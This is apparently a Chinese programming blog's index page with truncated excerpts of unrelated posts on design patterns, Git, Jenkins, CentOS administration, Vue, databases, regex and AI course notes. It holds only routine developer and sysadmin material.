总体来说，软件架构可以由不同的框架和不同的设计模式，再加上特定的构件组合来实现；框架可以根据设计模式结合特定编程语言和环境来实现。设计模式就是解决单一问题的设计思路和解决方法。
1 单例模式 一、总线 总线是计算机各种功能部件或者设备之间传送数据、控制信号等信息的公共通信解决方案之一。
现假设有如下场景：某中央处理器（CPU）通过某种协议总线与一个信号灯相连，信号灯有64种颜色可以设置，中央处理器上运行着三个线程，都可以对这个信号灯进行控制，并且可以独立设置该信号灯的颜色。
抽象掉协议细节（用打印表示），如何实现线程对信号等的控制逻辑。
加线程锁进行控制，无疑是最先想到的方法，但各个线程对锁的控制，无疑加大了模块之间的耦合。下面，我们就用设计模式中的单例模式，来解决这个问题。
什么是单例模式？单例模式是指：保证一个类仅有一个实例，并提供一个访问它的全局访问点。
具体到此例中，总线对象，就是一个单例，它仅有一个实例，各个线程对总线的访问只有一个全局访问点，即惟一的实例。
Python代码如下：
import threading import time class Singleton(object): def __new__(cls, *args, **kw): if not hasattr(cls, '_instance'): orig = super(Singleton, cls) cls._instance = orig.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d5a4c5ae8647f64fc88a364cde1ed7e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7cf4084018a8153bbf4cd1982c828c24/" rel="bookmark">
			webpack 以及 git
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要求有若干个logo图标， 在一块区域进行展示， 要求每行固定展示五个并且间距要均匀 ，不得直接设置width，
js闭包的理解
节流就是闭包
比如百度搜索 ，如果每次用户键入信息都调用api接口 ，合理吗， 如何优化，
了解webpack吗? 说说什么是code spilt，
let和const，
react要放弃哪些生命周期? 为什么?
componentWillMount
componentWillUpdate
componentsWillRecieveProps
试想，假如你在 componentWillxxx 里发起了一个付款请求。由于 render 阶段里的生命周期都可以重复执行，在 componentWillxxx 被打断 + 重启多次后，就会发出多个付款请求。
比如说，这件商品单价只要 10 块钱，用户也只点击了一次付款。但实际却可能因为 componentWillxxx 被打断 + 重启多次而多次调用付款接口，最终付了 50 块钱；又或者你可能会习惯在 componentWillReceiveProps 里操作 DOM（比如说删除符合某个特征的元素），那么 componentWillReceiveProps 若是执行了两次，你可能就会一口气删掉两个符合该特征的元素。
react setState何时为同步 何时为异步(或者说如何让它同步产生结果)，https://blog.51cto.com/u_15127495/2662267
用过umi或者dva吗 ，它给你原生使用redux带来的不同在于什么? 用过mobx吗 说说他和redux的异同，
说说你都会做哪些方面的优化， 简述一下webSocket …
https://blog.csdn.net/weixin_40746230/article/details/125195436 https://mp.weixin.qq.com/s?__biz=MjM5MDA2MTI1MA==&amp;mid=2649112452&amp;idx=3&amp;sn=29e5901263eae442e1829be1220d266a&amp;chksm=be581829892f913f930b5c6a5d7c31f335dfd919b93545bdd1e06c18f5413d220f1882401f04&amp;scene=27
查看所有分支简化的提交历史记录git reflog
git reset --hard
git branch查看分支
创建并切换分支git checkout -b 分支名称
git branch -d 分支名称 删除分支
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7cf4084018a8153bbf4cd1982c828c24/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29f15e8185dce41d1f36c22b76810c25/" rel="bookmark">
			根据pom.xml文件下载依赖
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下载maven到本地
maven下载地址:http://maven.apache.org/download.cgi
下载完成后, 将其解压到任意文件夹; 将pom.xml文件放到bin文件夹下
bin文件夹：MavenHome\apache-maven-3.8.7-bin\bin
修改本地仓库地址
默认地址：C:/.m2/repository
配置文件settings.xml（MavenHome\apache-maven-3.8.7-bin\conf\settings.xml）
新建一个bat批处理文件, 将其内容修改为
call mvn -f pom.xml dependency:copy-dependencies @pause 双击.bat文件后, 稍等片刻, 显示构建成功
依赖和jar地址
bin文件：
jar包在bin文件里的target文件夹
依赖在本地仓库
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/12f12b465465079d3c0a19f50ee25a0c/" rel="bookmark">
			Vue中eventBus的实现，以及开发基础常用方法记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		~~~~~~~~~~~~~~~~~~~~~~~BUS实现步骤~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
首先在项目目录中创建bus.js，
2.并且引入vue
import Vue from 'vue'; const bus = new Vue(); export default bus; 3.在发起通讯组件跟接收通讯组件中引入bus.js
import bus from '@/utils/bus.js' 4.首先在发起通讯的组件中去注册事件并且发射出去 根据需要去判断是否传参。
// 需要传参的情况下 bus.$emit('name',obj) // 无需传参的情况 bus.$emit('name') 5.在接收的组件中去接受事件
bus.$on('name',data=&gt;{ //执行对应接收组件传参的方法 }) 以上为兄弟组件之间的通信bus
不过在注册bus事件的时候尽量名称保持不一致不然他会执行多个相同名字的方法，根据你注册发射事件的事件去先后执行，一般正常情况下用的不会特别多，大部分都是父子组件通信
~~~~~~~~~~~~~~~~~~~~~~~常用事件~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// eltable表頭加星號 export function renderHeader(h, { column }) { return [ h('span', { style: 'color:#ff4949;margin-right:4px', },'*'), h('span', column.label), ]; } // 文件地址拼接前綴 export function spliceFileUrl(filePath) { if( filePath.indexOf("http"||"https")!=-1){ return filePath; } return this.global.fileUrl + filePath; } // 根據value獲取label export function getArrayLabelByValue(enumArr,selValue,label,value) { let config = { label: label || 'label', value: value || 'value', }; var str = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/12f12b465465079d3c0a19f50ee25a0c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/292100edc4674ec9b3a529761c228f5a/" rel="bookmark">
			【Git 从入门到精通】2023最新版的Git安装与卸载每一步附详细讲解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 安装1.下载Git2.开始安装 卸载1.找到电脑中的Git2.卸载3.删除环境变量 安装 1.下载Git 首先去官网下载Git安装包，可以直接在百度搜索Git，以下几个网站都可以。也可以点击直达，官网上下载如果不科学上网的话还是很慢的，所以我准备了一份放在了百度网盘内，需要的可以去评论区拿。
2.开始安装 当从上面网站或者百度网盘中下载完exe文件之后，咱们就可以开始安装了。
按照下面步骤进行安装即可：
选择 Git 安装位置，要求是非中文并且没有空格的目录，然后下一步。
Git 选项配置，推荐默认设置，然后下一步。
Git 安装目录名，不用修改，直接点击下一步。
Git 的默认编辑器，建议使用默认的 Vim 编辑器，然后点击下一步。
默认分支名设置，选择让 Git 决定，分支名默认为 master，下一步。
修改 Git 的环境变量，选第二个，修改环境变量，可以在命令行使用Git命令。
选择后台客户端连接协议，选默认值 OpenSSL，然后下一步。
配置 Git 文件的行末换行符，Windows 使用 CRLF，Linux 使用 LF，选择第一个自动
转换，然后继续下一步。
选择 Git 终端类型，选择默认的 Git Bash 终端，然后继续下一步。
选择 Git pull 合并的模式，选择默认，然后下一步。
选择 Git 的凭据管理器，选择默认的跨平台的凭据管理器，然后下一步。
其他配置，选择默认设置，然后下一步。
实验室功能，技术还不成熟，有已知的 bug，不要勾选，然后点击右下角的 Install
按钮，开始安装 Git。
点击 Finsh 按钮，Git 安装成功！
右键任意位置，在右键菜单里选择 Git Bash Here 即可打开 Git Bash 命令行终端。
在 Git Bash 终端里输入 git --version 查看 git 版本，如图所示，说明 Git 安装成功。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/292100edc4674ec9b3a529761c228f5a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9eb03eee92774dcefdc46b2222748eb4/" rel="bookmark">
			轻松掌握Jenkins
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		创建Jenkins 一、docker安装Jenkins1.linux服务器2.web 二、流水线1.gitlab连接jenkins1.jenkins服务器创建密钥2.添加gitlab密钥3.创建gitlab访问令牌4.安装jenkins插件5.配置 GitLab 凭据 2.创建流水线1.新增凭证配置 Username with password2.创建任务3.构建触发器4.构建5.配置gitlab1.修复gitlab报错2.测试 Webhook 配置 6.推送文件到gitlab（192.168.122.30） Jenkins官网 https://www.jenkins.io/zh/doc/book/installing/ 主机ip:192.168.122.30 端口:8080 在实际开发中，我们经常要一边开发一边测试，当然这里说的测试并不是程序员对自己代码的单元测试，而是同组程序员将代码提交后，由测试人员测试；或者前后端分离后，经常会修改接口，然后重新部署；这些情况都会涉及到频繁的打包部署；
手动打包常规步骤：
1.提交代码 2.问一下同组小伙伴有没有要提交的代码 3.拉取代码并打包（war包，或者jar包） 4.上传到Linux服务器 5.查看当前程序是否在运行 6.关闭当前程序 7.启动新的jar包 8.观察日志看是否启动成功 9.如果有同事说，自己还有代码没有提交......再次重复1到8的步骤！！！！！（一上午没了） 那么，有一种工具能够实现，将代码提交到git后就自动打包部署勒，答案是肯定的：Jenkins当然除了Jenkins以外，也还有其他的工具可以实现自动化部署，如Hudson等只是Jenkins相对来说，使用得更广泛。
一、docker安装Jenkins 1.linux服务器 mkdir /var/jenkins_home docker run -u root --rm -d -p 8080:8080 -p 50000:50000 -v jenkins-data:/var/jenkins_home -v /var/run/docker.sock:/var/run/docker.sock jenkinsci/blueocean docker ps -a netstat -tlnup|grep 8080 http://192.168.122.30:8080/ 2.web [root@master ~]# docker exec -it 0cc05426358c sh / # cat /var/jenkins_home/secrets/initialAdminPassword 进入容器取管理员密码
点击 安装推进的插件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9eb03eee92774dcefdc46b2222748eb4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c919b1fac259e0ccd924863fcbd8a29e/" rel="bookmark">
			centos7 配置dns服务器地址并立即生效,保证重启后仍然生效
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在 CentOS 7 上配置 DNS 服务器地址并立即生效，需要执行以下步骤:
使用管理员权限打开终端。使用编辑器(如 vi)打开 /etc/resolv.conf 文件。在文件末尾添加 DNS 服务器地址。格式为 "nameserver x.x.x.x"，其中 x.x.x.x 是 DNS 服务器的 IP 地址。保存文件并退出编辑器。立即使配置生效，在终端中输入 "systemctl restart NetworkManager"。 为了保证重启后配置仍然生效，可以考虑使用 NetworkManager 的配置文件. 可以在 /etc/Network
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af1f6851620a4cde7af6109a85a6a237/" rel="bookmark">
			Centos7安装wget
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		官网 https://www.gnu.org/software/wget/
环境 CentOS7
yum 安装
sudo yum install wget
这个报错，查资料是说，网络不通 ping 了下，返回 Name or service not known ，从错误看应该是没有配置DNS
配置DNS参考https://www.cnblogs.com/hans_gis/p/10639187.html
sudo vi /etc/resolv.conf
修改后
再次ping 可以了，再次执行安装命令sudo yum install wget
安装成功~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/953cab591e9c5ee01c4e23ab09876594/" rel="bookmark">
			国科大《高级人工智能》沈老师部分——行为主义笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		国科大《高级人工智能》沈老师部分——行为主义笔记
沈华伟老师yyds，每次上他的课都有一种深入浅出的感觉，他能够把很难的东西讲的很简单，听完就是醍醐灌顶，理解起来特别清晰今年考试题目这部分跟往年基本一样，沈老师画的重点才是真的重点 文章目录 一、蚁群优化算法二、粒子群算法三、多臂赌博机四、马尔科夫决策过程五、策略学习六、博弈七、GNN卷积网络八、因果分析考试回忆 一、蚁群优化算法 思想：局部随机搜索+自增强基本原理：用蚂蚁的行走路径表示待优化问题的可行解，整个蚂蚁群体的所有路径构成待优化问题的解空间。
蚂蚁依概率选择侯选位置移动，在经过的路径上留下信息素，信息素会随时间挥发，且信息素浓度大的路径更易被选取。 最终，整个蚂蚁会在正反馈的作用下集中到最佳的路径上，此时对应的便是待优化问题的最优解。算法过程：对m只蚂蚁随机放在n个城市，按照公式选择下一个城市的概率，此时公式正比于信息素浓度；
所有蚂蚁周游完后，更新信息素（与路的长度、挥发速度相关）；适用范围：一种离散的解空间搜索方法，适用于图中找最优路径 二、粒子群算法 思想：随机优化
基本原理：
每个粒子对应于一个可行解，粒子通过位置和速度表示（速度：下一步移动的方向和距离，位置：求解问题的一个解）粒子根据对其他个体信息+位置的评价，更新自己的速度与位置；重复直到粒子群找到问题的最优解 算法过程：
初始化粒子群：随机生成粒子的位置和速度；当前粒子最优位置 全局最优位置 循环直到满足条件 ①计算每个粒子的适应度函数②更新每个粒子历史最好适应度+相应位置，更新当前全局最好适应度+位置③更新粒子的速度和位置：速度 = 原速度倾向 + 回到历史最优位置的倾向 + 粒子群全局最优位置的倾向
适用范围：求解连续解空间的优化问题
三、多臂赌博机 优化目标：摇固定次数的臂，获得期望累计奖励最大探索与优化关系：利用（即时奖励最大化） + 探索（长期奖励最大化）乐观初值法：为每个行为赋一个高的初始估值，初期每个行为都有较大机会被exploreUCB：选择潜力大的行为：依据估值的置信上界行为选择（当前估值高+不确定性高） 四、马尔科夫决策过程 马尔科夫决策过程：采取行动a转变为下一状态后，获得奖励要素：状态、行为、模型奖励假设：最终目标能通过最大化累计奖励实现贝尔曼方程
格子世界问题（见后） 五、策略学习 动态规划：
策略估值：策略=》估值策略提升：根据当前估值=&gt;新策略策略迭代：从初始策略开始，迭代进行策略估值和策略提升，最终得到最优策略估值迭代：从初始状态估值开始，进行估值迭代，找到最优状态估，进而根据最优估值，贪心得到最优策略 动态规划、蒙特卡洛、时序差分联系和区别（图）
动态规划：一层全展开蒙特卡洛：基于经验，一条线暴力搜索：全部展开时序差分：基于经验自举，只有一步的一条线 六、博弈 博弈要素：局中人（策略制定者）、策略（可供局中人选择的行动方案）、效用函数（最大化自己的效用）零和博弈：效用函数玩家收益之和为0（剪刀石头布）最佳应对：针对其他人当前策略，自己当前策略优于自己其他策略纳什均衡：相对其他局中人的最佳应对（谁动谁吃亏）社会最优：和最优帕累托最优：至少一人最优囚徒困境： 帕累托最优决策组合：（坦白，抗拒），（抗拒，坦白）和（抗拒，抗拒）纳什均衡策略组合：（坦白，坦白）不是帕累托最优社会最优策略组合：（抗拒，抗拒）
拍卖： 首价：同时提交密封报价，选出价最高以出价购买；最优报价低于估价；人越多，报价越接近估价 纳什均衡：每个竞拍者的报价低于其对商品的估价 次价：同时提交密封报价，选出价最高以第二高出价购买 纳什均衡：每个竞拍者会倾向于采用其对商品的估价进行报价 讨价对象：双方对商品估值之差maxmin、minmax策略： Maxmin：最大化自己最坏情况下的利益minmax：最小化对手最好情况下的利益零和博弈时收益对偶 匹配市场：对于z： 7 5 2 - 5 2 0 = 2 3 0，3最大，选b
议价权 稳定结局：未配对的边收益和&gt;=1
纳什议价解： 剩余价值：1-x-yA收益=(1+x-y)/2B收益=(1+y-x)/2 均衡结局：任意配对边都满足
备选项：不与当前配对的话，能得到的最大收益 七、GNN卷积网络 spectral谱方法（数学方法） 将图的拉普拉斯矩阵的特征向量作为基底，将样本投影到该空间后，进行卷积操作采用超参控制每次选择的相邻节点数量，对变化后的样本做 filter 和求加，再将输出结果进行拉普拉斯的逆变换，并输出非线性化后的结果 spatial空间方法（计算机方法） 从CNN向GCN卷积的k迁移问题在于，需要确定一个固定的邻域，后续卷积的定序、参数共享步骤都可以在确定邻域后解决 谱方法可以被定义为空间方法的一个子集 相较于空间方法在原始空间定义聚合函数，谱方法在规范后实质上是对变换到新的空间中的样本进行卷积因此谱方法可以被看作是变换空间后的空间方法，其从属于空间方法这一类别。而谱方法将显式地写出了空间变换，空间方法直接将 kernel matrix 定义出来，未写明变换的空间 八、因果分析 d分离问题判断：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/953cab591e9c5ee01c4e23ab09876594/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9089af9ecea07d982d91ce9e643e1a2a/" rel="bookmark">
			git仓库清理瘦身解决 .git文件夹过大的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		git仓库清理找了很多资料和方案都没有很完美执行成功的；现在找到一个完美方案，分享给大家；希望能帮助大家
问题 1、gitlab代码开发了仓库开发了五年了，代码只有10M；clone的时候要700多兆很浪费时间
2、创建分支和切换分支耗时，导致电脑崩溃
3、公司内部接入codereview服务；因为项目过大服务器承载不了，接入失败
git仓库过大的原因：
1、历史提交的文件，后来删除了，但是.git\objects\pack还会记录保持这些文件
2、git rev-list --objects --all | grep “$(git verify-pack -v .git/objects/pack/*.idx | sort -k 3 -n | tail -500 | awk ‘{print$1}’)”
执行上面命令，查看前500个大文件；发现全是dist目录的文件上传有2000多个
解决方案： 方案一：（2个小时耗时，不保证成功） 下面通用方案不行了；这种方法清理非常耗时而且代码分支多的不容易成功
清理文件 git filter-branch --force --index-filter "git rm -rf --cached --ignore-unmatch 文件/文件夹" --prune-empty --tag-name-filter cat -- --all # 查看历史大文件 git rev-list --objects --all | grep "$(git verify-pack -v .git/objects/pack/*.idx | sort -k 3 -n | tail -5 | awk '{print$1}')"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9089af9ecea07d982d91ce9e643e1a2a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc5233379b25e55e2fcfc305f0918370/" rel="bookmark">
			【高级人工智能】国科大《高级人工智能》联结主义 笔记 &#43; 考试回忆
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		国科大《高级人工智能》吴老师部分——联结主义笔记
吴老师上课dddd，上课东西太多太杂，听不太懂比较煎熬，但是课后花点时间理解理解，还是挺有帮助的考试按照重点复习即可，虽然答疑时提到的传教士野人没考😅，但是知识点基本都在最后一节ppt里听说下一届就不会用原题了 文章目录 一、搜索1.概念形式化描述野人与传教士问题搜索算法特性 2.树搜索深度优先DFS广度优先BFS3.启发式搜索4.图搜索5.局部搜索 二、人工神经网络1.神经网络2.感知机3.深度神经网络4.CNN卷积网络5.RNN6.GAN生成式对抗网络 考试回忆 一、搜索 1.概念 形式化描述 搜索问题的形式化描述：
状态空间后继函数初始状态目标测试=&gt; 解：一个行动序列，将初始状态转换成目标状态 野人与传教士问题 状态空间：{(左岸传教士数量, 左岸野人数量, 船状态[1在左岸，0在右岸])}后继函数：{ P01, P10, P02, P20, P11, Q01, Q10,Q02, Q20, Q11}（船向左/右, 船上传教士数量, 船上野人数量）耗散函数：当前状态下船从一侧划到另外一侧耗散值为1个单位初始状态：(3, 3, 1)目标状态：(0, 0, 0)
搜索算法特性 完备性(问题有解且能找到一个)最优性(保证找到最优解[最小损耗])时间、空间复杂度 2.树搜索 扩展出潜在行动，维护行动的边缘节点，扩展尽可能少的树节点。
深度优先DFS 描述：回溯，每次从边缘集合选最深的[栈]不保证完备性(有环层数无限大)与最优性(无视深度损失)m层b叉：时O(bm) 空O(bm)迭代深入搜索：结合DFS空间优势+BFS时间优势 广度优先BFS 描述：对每个相邻节点再访问其相邻但是未被访问过的节点[队列]保证完备性+最优性m层b叉：时O(bm) 空O(bm)代价一致搜索：总是扩展路径消耗最小的节点 3.启发式搜索 描述：利用问题拥有的启发信息引导搜索启发策略：估计一个状态到目标距离的函数贪婪搜索：扩展离目标最近的节点，不具完备性、最优性 评价节点：启发函数f(n)=h(n)(当前节点到终点的开销) A*搜索：代价一致搜索 + Greedy， 评价：f(n)=代价函数g(n) +启发函数h(n) 启发函数可采纳-&gt;最优性 4.图搜索 描述：避免重复状态，不扩展一个状态两次：树搜索+扩展过的状态集(closed set)A*图搜索：启发式的一致性 =&gt; A*图最优 一致性：沿路径的节点估计耗散 f 值单调递增：h(A) ≤ cost(A to C) + h© 5.局部搜索 描述：改进单一选项直到不能再改善为止；新的后继函数: 局部改变；不完备，不最优爬山法：任意位置起始，重复直到移动到最好的相邻状态（可能局部最优解）模拟退火搜索：引入随机因素，避免局部极大（允许向山下移动）遗传算法：适应度函数，每步保留N个最好状态 二、人工神经网络 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dc5233379b25e55e2fcfc305f0918370/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/51a5caa5759cfe5eba299641c52e6216/" rel="bookmark">
			人大金仓KingbaseES 中truncate和oracle中truncate区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		truncate命令在KingbaseES中本质上区别于oracle。因为oracle中，数据文件datafile可以被表所共享，每张表被分配各自的连续的extents。而在KingbaseES中，数据文件是独立的，不同表不存在共享数据文件的说法。
下面我们看一下KingbaseES数据库在内部怎么实现的truncate命令。
createtable t4 asselect*from t3; insertinto t4 select*from t4; insertinto t4 select*from t4; insertinto t4 select*from t4; insertinto t4 select*from t4; insertinto t4 select*from t4; selectcount(*) from t4; vacuum t4; select relfilenode from sys_class where relname='t4'; select pg_relation_filepath('t4'); [kingbase@localhost16052]$ ll 252980*-rw------- 1 kingbase kingbase 8192 Oct 19 10:47 252980-rw------- 1 kingbase kingbase 24576 Oct 19 10:47 252980_fsm-rw------- 1 kingbase kingbase 8192 Oct 19 10:47 252980_vm 下面开启事务执行
begin; truncatetable t4; selectcount(*) from t4; select relfilenode from sys_class where relname='t4'; 这时候 relfilenode变成了252983,大小是0的对象，而原来的relfilenode 250980 还在，大小不变。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/51a5caa5759cfe5eba299641c52e6216/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f70a42c931b6ea00c264453eadfe9bcd/" rel="bookmark">
			less命令详解-最好用的文档查看命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 less命令详解-最好用的文档查看命令 其他文件查看命令less使用场景less的日常使用less快捷键less参数 其他文件查看命令 # 小文本查看命令 cat ：将文件所有内容打印打控制台 tac ：将文件所有内容反向打印打控制台 vi ：文本编辑 more ：以全屏幕的方式按页显示文本文件的内容 tail ：显示文档末尾 less使用场景 对于特别大的日志文件(十几GB)，cat、vi显然不适用。
文件特别小，可直接cat或者tac打印出来。
但是
cat会一直往屏幕输出文本，直到文本读取到结尾，vi则会将文件全部加载到内存，才开始显示内容。
如果系统可用内存空间吃紧，可能造成其他应用无法开辟新的内存空间。
为什么less比tail好用？
tail只能查看文档尾tail不支持翻页tail不支持查找 less的日常使用 less快捷键 q :退出less f ：向上翻页 b ：向下翻页 （page up、page down也可） g ：查看文档头 G ：查看文档尾 F ：同tail -f效果，打印文档最新内容，Ctrl c退出 v ：进入vmi模式，同vi less参数 -f 强制显示文件 -n 忽略行号（文件特别大时需要忽略行号加快速度） -N 显示行号 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c6dd65d9c7e30ede04b06e840f053463/" rel="bookmark">
			centos忘记密码怎么办
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果您忘记了CentOS的密码，您可以通过重新启动计算机并进入单用户模式来重置密码。
重新启动计算机并按下 "ESC" 或 "F10" 进入引导菜单。
选择 "CentOS (x86_64)"，然后按 "e" 进入编辑模式。
在第三行后面添加 "1"，并按 "CTRL + x" 启动。
在单用户模式下，使用命令"passwd" 更改密码，更改完成后重启即可。
5.如果需要在虚拟机中重置密码，可以使用ISO 重新安装系统
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee310f408f19ef7e1372bfc6ffed4272/" rel="bookmark">
			使用python的re库精准匹配单词
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景：针对跨境电商产品，要对英文标题中的某个词或组合词进行精准匹配，将匹配成功的产品进行删除
需要注意的是，这个词或组合词必须是在标题中独立存在的才算匹配成功，不能是某个词的组成部分
所以这里的重点是精准匹配，否则会误删其他不需要产品，所以关于如何精准匹配，这里写下我的思路
一个词在标题中无非就三个位置：开头、中间、结尾
因为英文标题中的每个单词之间是使用空格进行分隔的，所以针对这三个位置逐一进行匹配即可，这里采用正则库re
代码如下：
import re def pattern_word(search_word, en_title): """ params：search_word, str, 需要匹配的词 params：en_title, str, 被匹配的英文标题 return：pattern_result, bool, 匹配结果 """ r1 = re.findall(f'^{search_word}$', en_title) r2 = re.findall(f'^{search_word} ', en_title) # 词是否在标题开头位置 r3 = re.findall(f' {search_word}$', en_title) # 词是否在标题末尾位置 r4 = re.findall(f' {search_word} ', en_title) # 词是否在标题中间位置 result = r1 + r2 + r3 + r4 return True if result else False # 无论在哪个位置，如果有成功匹配到，则表示该产品是需要删除的 if __name__ == '__main__': search_word = 'Analog Digital' en_title = 'this is a test there are words other word Analog Digitalas' pattern_result = pattern_word(search_word, en_title) print(f'搜索词：{search_word}') print(f'标题：{en_title}') print(f'匹配结果：{pattern_result}') 以下是测试结果：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ee310f408f19ef7e1372bfc6ffed4272/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f147faffe37b52f8c4923ea7d1ce0bbf/" rel="bookmark">
			vue3 图片放大缩小、拖拽功能（自定义指令）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		效果 自定义 拖拽指令 vDrag.js 参考来源 https://github.com/sunzsh export const initVDrag = (Vue) =&gt; { Vue.directive("drag", (el) =&gt; { const oDiv = el // 当前元素 const minTop = oDiv.getAttribute("drag-min-top") const ifMoveSizeArea = 20 oDiv.onmousedown = (e) =&gt; { let target = oDiv while ( window.getComputedStyle(target).position !== "absolute" &amp;&amp; target !== document.body ) { target = target.parentElement } document.onselectstart = () =&gt; { return false } if (!target.getAttribute("init_x")) { target.setAttribute("init_x", target.offsetLeft) target.setAttribute("init_y", target.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f147faffe37b52f8c4923ea7d1ce0bbf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd2d4d34c7e4212804295de9ac42d759/" rel="bookmark">
			centos8中文语言改为英文语言
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		修改/etc/locale.conf 为en_US.UTF-8
LANG=en_US.UTF-8
重启后生效
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03c299814364d83deedc5c6a6c155ca3/" rel="bookmark">
			uniapp和apicloud哪个好
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这取决于您的需求和使用场景。
UniApp是一个使用Vue.js开发跨平台移动应用的框架，它可以使用一套代码在iOS、Android、H5、微信小程序等多个平台上运行。它有着丰富的社区支持，开发者可以方便的找到解决问题的方案。
ApiCloud是一个云端应用开发平台，提供了一系列的开发工具和云端服务，能够帮助开发者快速构建跨平台移动应用。它也支持使用原生语言开发应用，可以提供更高的性能和体验。
对于更喜欢使用Vue.js进行开发的开发者，UniApp可能是一个更好的选择，而对于对性能有更高要求的开发者，ApiCloud可能是一个更好的选择。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18be5171d3f88ee7834d42d738be8245/" rel="bookmark">
			杰卡德相似度(Jaccard)详解及在UserCF中的应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、杰卡德相似度(Jaccard) 这个是衡量两个集合的相似度一种指标。 两个集合A和B的交集元素在A，B的并集中所占的比例，称为两个集合的杰卡德相似系数，用符号J(A,B)表示
另一种表示的方法：
jaccard系数衡量维度相似性 jaccard系数很适合用来分析多个维度间的相似性，也多被用于推荐系统中用来给用户推荐相似的产品或业务。
举个例子，要计算某网站的两个用户的相似性，可以从性别、地区、年龄、浏览时间等等维度进行分析，我们把这些维度再进行细化：
男性、女性、小于18岁、18岁-40岁、40岁以上、浏览时间为早上、浏览时间为中午、浏览时间为下午
将以上维度作为一个集合，对两个用户A 和B ，将符合以上维度的指标值置为1，其他置为0。
假设用户A = [男性=1, 女性=0, 小于18岁=0, 18岁-40岁=1, 40岁以上=0, 浏览时间为早上=0, 浏览时间为中午=0, 浏览时间为下午=1]
假设用户B = [男性=1, 女性=0, 小于18岁=1, 18岁-40岁=0, 40岁以上=0, 浏览时间为早上=0, 浏览时间为中午=0, 浏览时间为下午=1]
即他们只有年龄不同，则根据计算公式，得到的jaccard系数值为：
jaccard系数衡量文本相似性 虽然jaccard主要是在维度分析这样的稀疏向量中作用比较大，但是在文本相似度计算时也可用jaccard。
用在文本相似度上，就是将字符串A, B分别进行分词，用交集中的词语数和并集中的词语数求比值。
A = [今天,天气,真好]
B = [今天,天气,不错]
转换为01向量
